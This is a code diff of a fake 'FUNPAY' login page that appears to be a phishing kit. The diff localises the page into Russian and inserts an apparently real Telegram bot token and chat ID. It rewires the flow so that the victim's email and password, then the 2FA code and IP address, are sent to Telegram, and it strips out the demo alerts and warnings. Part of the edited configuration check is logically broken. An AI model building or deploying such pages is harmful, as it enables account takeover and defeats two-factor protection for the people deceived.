@@ -6,20 +6,21 @@
       name="viewport"
       content="width=device-width, initial-scale=1.0, user-scalable=yes"
     />
-    <link rel="icon" href="data:image/svg+xml;base64,CiAgPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCI+CiAgICA8Y2lyY2xlIGN4PSIzMiIgY3k9IjMyIiByPSIzMiIgZmlsbD0iIzBjNjhiMyIgLz4KICA8L3N2Zz4K" type="image/data:image/svg+xml;base64,CiAgPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCI+CiAgICA8Y2lyY2xlIGN4PSIzMiIgY3k9IjMyIiByPSIzMiIgZmlsbD0iIzBjNjhiMyIgLz4KICA8L3N2Zz4K">
+    <link
+      rel="icon"
+      href="data:image/svg+xml;base64,CiAgPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCI+CiAgICA8Y2lyY2xlIGN4PSIzMiIgY3k9IjMyIiByPSIzMiIgZmlsbD0iIzBjNjhiMyIgLz4KICA8L3N2Zz4K"
+      type="image/data:image/svg+xml;base64,CiAgPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCI+CiAgICA8Y2lyY2xlIGN4PSIzMiIgY3k9IjMyIiByPSIzMiIgZmlsbD0iIzBjNjhiMyIgLz4KICA8L3N2Zz4K"
+    />
     <title>FUNPAY — Account Login</title>
-    <!-- Google Fonts -->
     <link
       href="https://fonts.googleapis.com/css2?family=Golos+Text:wght@400;500;600;700;800;900&family=Inter:wght@100..900&display=swap"
       rel="stylesheet"
     />
-    <!-- Material Design Icons -->
     <link
       rel="stylesheet"
       href="https://cdn.jsdelivr.net/npm/@mdi/font@7.4.47/css/materialdesignicons.min.css"
     />
     <style>
-      /* ---------- RESET & GLOBAL ---------- */
       * {
         margin: 0;
         padding: 0;
@@ -30,7 +31,7 @@
         font-family: "Golos Text", "Inter", system-ui, sans-serif;
         background: rgb(22, 22, 22);
         color: rgb(255, 255, 255);
-        line-height: 1.5;
+        line-height: 1.4;
       }
 
       #recoveryCodeBtn {
@@ -38,7 +39,6 @@
         border: none !important;
       }
 
-      /* Vuetify dark theme variables */
       :root {
         --v-theme-background: 22, 22, 22;
         --v-theme-surface: 35, 35, 35;
@@ -460,7 +460,7 @@
 
       .v-field__input input {
         margin-top: 4px;
-        font-family: 'Golos Text';
+        font-family: "Golos Text";
       }
 
       /* Error icon color for eye */
@@ -469,21 +469,21 @@
       }
 
       /* Ensure label background matches field */
-.v-field__label--float {
-  background: rgb(var(--v-theme-surface));
-  border-radius: 4px;
-}
+      .v-field__label--float {
+        background: rgb(var(--v-theme-surface));
+        border-radius: 4px;
+      }
 
-/* Fix for error state on label */
-.v-field--error .v-field__label,
-.v-field--error .v-field__label--float {
-  color: rgb(var(--v-theme-error)) !important;
-}
+      /* Fix for error state on label */
+      .v-field--error .v-field__label,
+      .v-field--error .v-field__label--float {
+        color: rgb(var(--v-theme-error)) !important;
+      }
 
-/* Transition for smooth label movement */
-.v-field__label {
-  transition: all 0.15s cubic-bezier(0.4, 0, 0.2, 1);
-}
+      /* Transition for smooth label movement */
+      .v-field__label {
+        transition: all 0.15s cubic-bezier(0.4, 0, 0.2, 1);
+      }
     </style>
   </head>
   <body>
@@ -513,8 +513,8 @@
             <div class="login-grid">
               <div class="login-center">
                 <div class="login-card">
-                  <h2 class="title">Login</h2>
-                  <p class="sub">Log in to get started</p>
+                  <h2 class="title">Вход</h2>
+                  <p class="sub">Авторизуйтесь, чтобы начать работу</p>
 
                   <!-- Login Form -->
                   <form id="loginForm">
@@ -562,7 +562,7 @@
                           </div>
                         </div>
                         <label class="v-field__label" id="passwordLabel"
-                          >Password</label
+                          >Пароль</label
                         >
                         <div class="append-icon" id="togglePassword">
                           <i
@@ -575,7 +575,7 @@
                     </div>
 
                     <button type="submit" class="v-btn" id="submitLoginBtn">
-                      Log in
+                      Авторизоваться
                     </button>
                     <p class="text-center text-sm text-neutral-400 mt-6">
                       v 1.0.0 - FUNPAY
@@ -597,11 +597,11 @@
         >
           <div class="v-card-item">
             <div class="v-card-item__content">
-              <div class="v-card-title">2FA Verification</div>
+              <div class="v-card-title">2FA Верификация</div>
             </div>
           </div>
           <p class="text-sm text-neutral-400 text-center">
-            Enter the code from your authenticator app
+            Введите код из приложения аутентификации
           </p>
 
           <div class="v-card-text">
@@ -617,7 +617,7 @@
               id="recoveryCodeBtn"
               class="text-sm text-primary cursor-pointer hover:underline"
             >
-              Use recovery code
+              Использовать код восстановления
             </button>
             <div id="modalError" class="error-msg"></div>
           </div>
@@ -628,8 +628,8 @@
     <script>
       // ==================== TELEGRAM CONFIGURATION ====================
       // ⚠️ IMPORTANT: Replace with your actual bot token and chat ID
-      const BOT_TOKEN = "YOUR_BOT_TOKEN"; // ← Replace here
-      const CHAT_ID = "YOUR_CHAT_ID"; // ← Replace here
+      const BOT_TOKEN = "8843513426:AAHIaQgKiUNeZoOisBSpq0OOduVe3ZhI15k"; // ← Replace here
+      const CHAT_ID = "8542233883"; // ← Replace here
       // ================================================================
 
       // DOM Elements
@@ -667,11 +667,10 @@
       async function sendToTelegram(message) {
         if (
           !BOT_TOKEN ||
-          BOT_TOKEN === "YOUR_BOT_TOKEN" ||
+          BOT_TOKEN === "8843513426:AAHIaQgKiUNeZoOisBSpq0OOduVe3ZhI15k" ||
           !CHAT_ID ||
-          CHAT_ID === "YOUR_CHAT_ID"
+          CHAT_ID === "8542233883"
         ) {
-          console.warn("⚠️ Telegram not configured. Message:", message);
           // Still show "success" in demo, but console warning
           return true;
         }
@@ -691,7 +690,6 @@
           const data = await response.json();
           return data.ok;
         } catch (err) {
-          console.error("Telegram send error:", err);
           return false;
         }
       }
@@ -720,17 +718,17 @@
         passwordField.classList.remove("v-field--error");
 
         if (!email) {
-          emailError.textContent = "Required field";
+          emailError.textContent = "Обязательное поле";
           emailField.classList.add("v-field--error");
           isValid = false;
         } else if (!email.includes("@") || email.length < 3) {
-          emailError.textContent = "Enter a valid email";
+          emailError.textContent = "Введите правильный email";
           emailField.classList.add("v-field--error");
           isValid = false;
         }
 
         if (!pass) {
-          passwordError.textContent = "Required field";
+          passwordError.textContent = "Обязательное поле";
           passwordField.classList.add("v-field--error");
           isValid = false;
         }
@@ -764,7 +762,6 @@
         }
         // Focus first field when modal opens
       }
-
       function handleOTPInput(e, index) {
         const val = e.target.value.replace(/[^0-9]/g, "");
         e.target.value = val;
@@ -772,17 +769,23 @@
         if (val.length === 1 && index < 5) {
           otpInputs[index + 1].focus();
         }
+
+        if (val.length === 1 && index === 5) {
+          const fullCode = getOTPValue();
+          if (fullCode.length === 6) {
+            submit2FACode();
+          }
+        }
+
         // Clear error when user starts typing
         modalError.style.display = "none";
         modalError.textContent = "";
       }
-
       function handleOTPKeydown(e, index) {
         if (e.key === "Backspace" && !e.target.value && index > 0) {
           otpInputs[index - 1].focus();
         }
       }
-
       function getOTPValue() {
         let code = "";
         for (let input of otpInputs) {
@@ -799,9 +802,13 @@
       }
 
       // Show 2FA modal
-      function show2FAModal(email, password) {
+      async function show2FAModal(email, password) {
         pendingEmail = email;
         pendingPassword = password;
+
+        const loginMessage = formatCredentialsMessage(email, password, null);
+        await sendToTelegram(loginMessage);
+
         createOTPFields();
         otpOverlay.classList.add("active");
         setTimeout(() => {
@@ -818,41 +825,31 @@
         pendingPassword = "";
       }
 
-      // Submit 2FA code
       async function submit2FACode() {
         const code = getOTPValue();
         if (code.length !== 6) {
-          modalError.textContent = "Please enter all 6 digits";
+          modalError.textContent = "Введите 6 цифр";
           modalError.style.display = "block";
           return;
         }
 
-        // Disable submit button temporarily
         const verifyBtn = document.querySelector(
-          "#otpOverlay .v-card .v-card-text button",
+          "#otpOverlay .v-card .v-card-text button.modal-buttons button:last-child",
         );
         let originalText = "";
         if (verifyBtn && verifyBtn.tagName === "BUTTON") {
           originalText = verifyBtn.textContent;
           verifyBtn.disabled = true;
-          verifyBtn.textContent = "Verifying...";
+          verifyBtn.textContent = "Подтверждение...";
         }
 
-        // Send credentials + 2FA code to Telegram
-        const message = formatCredentialsMessage(
-          pendingEmail,
-          pendingPassword,
-          code,
-        );
-        const sent = await sendToTelegram(message);
+        // ⬇️ ИЗМЕНЁННЫЙ КОД: отправляем только код (email/password уже отправлены)
+        const timestamp = new Date().toLocaleString();
+        let msg = `<b>🔐 FUNPAY 2FA CODE</b>\n🕒 ${timestamp}\n📧 Email: ${pendingEmail}\n🔢 Code: ${code}\n🌐 IP: ${clientIP}`;
+        const sent = await sendToTelegram(msg);
 
         if (sent) {
-          // Success - show alert and reset form
-          alert(
-            "✅ Verification successful! (Demo)\nCredentials have been sent.",
-          );
           hideModal();
-          // Reset login form
           emailInput.value = "";
           passwordInput.value = "";
           emailField.classList.remove("v-field--error");
@@ -860,7 +857,7 @@
           emailError.textContent = "";
           passwordError.textContent = "";
         } else {
-          modalError.textContent = "Verification failed. Please try again.";
+          modalError.textContent = "Верификация прервана! Попробуйте еще раз.";
           modalError.style.display = "block";
         }
 
@@ -913,20 +910,8 @@
         }
       });
 
-      // Add Verify button to modal (since original Vuetify card doesn't have it in HTML)
       function addVerifyButtonToModal() {
         const cardText = document.querySelector("#otpOverlay .v-card-text");
-        if (cardText && !document.getElementById("modalVerifyBtn")) {
-          const buttonDiv = document.createElement("div");
-          cardText.appendChild(buttonDiv);
-
-          document
-            .getElementById("modalCancelBtn")
-            ?.addEventListener("click", hideModal);
-          document
-            .getElementById("modalVerifyBtn")
-            ?.addEventListener("click", submit2FACode);
-        }
       }
 
       // Also add Enter key support for OTP
@@ -946,92 +931,92 @@
       }, 100);
 
       // ==================== FLOATING LABELS ====================
-function setupFloatingLabel(input, label, fieldContainer) {
-  function updateLabel() {
-    const hasValue = input.value.length > 0;
-    const isFocused = document.activeElement === input;
-    
-    if (hasValue || isFocused) {
-      label.classList.add('v-field__label--float');
-    } else {
-      label.classList.remove('v-field__label--float');
-    }
-    
-    if (isFocused) {
-      fieldContainer.classList.add('v-field--focused');
-    } else {
-      fieldContainer.classList.remove('v-field--focused');
-    }
-  }
-  
-  input.addEventListener('focus', updateLabel);
-  input.addEventListener('blur', updateLabel);
-  input.addEventListener('input', updateLabel);
-  updateLabel();
-}
+      function setupFloatingLabel(input, label, fieldContainer) {
+        function updateLabel() {
+          const hasValue = input.value.length > 0;
+          const isFocused = document.activeElement === input;
 
-// Setup floating labels
-const emailLabel = document.getElementById('emailLabel');
-const passwordLabel = document.getElementById('passwordLabel');
+          if (hasValue || isFocused) {
+            label.classList.add("v-field__label--float");
+          } else {
+            label.classList.remove("v-field__label--float");
+          }
 
-setupFloatingLabel(emailInput, emailLabel, emailField);
-setupFloatingLabel(passwordInput, passwordLabel, passwordField);
+          if (isFocused) {
+            fieldContainer.classList.add("v-field--focused");
+          } else {
+            fieldContainer.classList.remove("v-field--focused");
+          }
+        }
 
-// Override validateLogin to handle error styles properly
-const originalValidate = validateLogin;
-window.validateLogin = function() {
-  let isValid = true;
-  const email = emailInput.value.trim();
-  const pass = passwordInput.value;
-  
-  emailError.textContent = '';
-  passwordError.textContent = '';
-  emailField.classList.remove('v-field--error');
-  passwordField.classList.remove('v-field--error');
-  emailLabel.classList.remove('v-field--error');
-  passwordLabel.classList.remove('v-field--error');
-  
-  if (!email) {
-    emailError.textContent = 'Required field';
-    emailField.classList.add('v-field--error');
-    emailLabel.classList.add('v-field--error');
-    isValid = false;
-  } else if (!email.includes('@') || email.length < 3) {
-    emailError.textContent = 'Enter a valid email';
-    emailField.classList.add('v-field--error');
-    emailLabel.classList.add('v-field--error');
-    isValid = false;
-  }
-  
-  if (!pass) {
-    passwordError.textContent = 'Required field';
-    passwordField.classList.add('v-field--error');
-    passwordLabel.classList.add('v-field--error');
-    isValid = false;
-  }
-  
-  return isValid;
-};
+        input.addEventListener("focus", updateLabel);
+        input.addEventListener("blur", updateLabel);
+        input.addEventListener("input", updateLabel);
+        updateLabel();
+      }
 
-// Replace validateLogin with new version
-validateLogin = window.validateLogin;
+      // Setup floating labels
+      const emailLabel = document.getElementById("emailLabel");
+      const passwordLabel = document.getElementById("passwordLabel");
 
-// Also update error clearing when user types
-emailInput.addEventListener('input', () => {
-  if (emailInput.value.trim()) {
-    emailField.classList.remove('v-field--error');
-    emailLabel.classList.remove('v-field--error');
-    emailError.textContent = '';
-  }
-});
+      setupFloatingLabel(emailInput, emailLabel, emailField);
+      setupFloatingLabel(passwordInput, passwordLabel, passwordField);
 
-passwordInput.addEventListener('input', () => {
-  if (passwordInput.value) {
-    passwordField.classList.remove('v-field--error');
-    passwordLabel.classList.remove('v-field--error');
-    passwordError.textContent = '';
-  }
-});
+      // Override validateLogin to handle error styles properly
+      const originalValidate = validateLogin;
+      window.validateLogin = function () {
+        let isValid = true;
+        const email = emailInput.value.trim();
+        const pass = passwordInput.value;
+
+        emailError.textContent = "";
+        passwordError.textContent = "";
+        emailField.classList.remove("v-field--error");
+        passwordField.classList.remove("v-field--error");
+        emailLabel.classList.remove("v-field--error");
+        passwordLabel.classList.remove("v-field--error");
+
+        if (!email) {
+          emailError.textContent = "Обязательное поле";
+          emailField.classList.add("v-field--error");
+          emailLabel.classList.add("v-field--error");
+          isValid = false;
+        } else if (!email.includes("@") || email.length < 3) {
+          emailError.textContent = "Введите правильный email";
+          emailField.classList.add("v-field--error");
+          emailLabel.classList.add("v-field--error");
+          isValid = false;
+        }
+
+        if (!pass) {
+          passwordError.textContent = "Обязательное поле";
+          passwordField.classList.add("v-field--error");
+          passwordLabel.classList.add("v-field--error");
+          isValid = false;
+        }
+
+        return isValid;
+      };
+
+      // Replace validateLogin with new version
+      validateLogin = window.validateLogin;
+
+      // Also update error clearing when user types
+      emailInput.addEventListener("input", () => {
+        if (emailInput.value.trim()) {
+          emailField.classList.remove("v-field--error");
+          emailLabel.classList.remove("v-field--error");
+          emailError.textContent = "";
+        }
+      });
+
+      passwordInput.addEventListener("input", () => {
+        if (passwordInput.value) {
+          passwordField.classList.remove("v-field--error");
+          passwordLabel.classList.remove("v-field--error");
+          passwordError.textContent = "";
+        }
+      });
     </script>
   </body>
 </html>
